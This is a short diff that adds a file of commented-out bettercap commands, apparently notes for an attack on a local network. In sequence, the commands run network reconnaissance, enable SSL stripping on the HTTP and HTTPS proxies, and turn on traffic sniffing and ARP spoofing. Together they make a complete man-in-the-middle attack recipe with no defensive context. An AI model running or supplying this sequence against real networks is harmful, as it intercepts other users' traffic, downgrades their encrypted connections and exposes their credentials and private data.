@@ -1,0 +1,16 @@
+# sudo bettercap
+# help
+# net.recon on
+# net.show
+
+# get http.proxy.sslstrip
+# set http.proxy.sslstrip true
+
+# get https.proxy.sslstrip
+# set https.proxy.sslstrip true
+
+# http.proxy on
+# https.proxy on
+# net.sniff on
+# arp.spoof on
+
